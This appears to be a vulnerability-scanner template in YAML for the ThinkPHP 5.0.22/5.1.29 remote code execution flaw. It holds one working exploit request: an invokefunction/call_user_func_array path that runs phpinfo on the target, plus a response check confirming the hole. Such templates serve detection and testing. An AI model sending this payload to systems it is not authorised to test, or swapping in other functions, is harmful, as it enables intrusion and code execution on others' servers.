id: thinkphp-5022-rce

info:
  name: ThinkPHP 5.0.22 RCE
  author: dr_set
  severity: critical
  description: Thinkphp5 5.0.22/5.1.29 Remote Code Execution if the website doesn't have mandatory routing enabled (which is default).
  reference: 
    - https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  tags: thinkphp,rce

manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
        expression: response.status == 200 && response.body.bcontains(b"PHP Extension") && response.body.bcontains(b"PHP Version") && response.body.bcontains(b"ThinkPHP")
expression: r0()
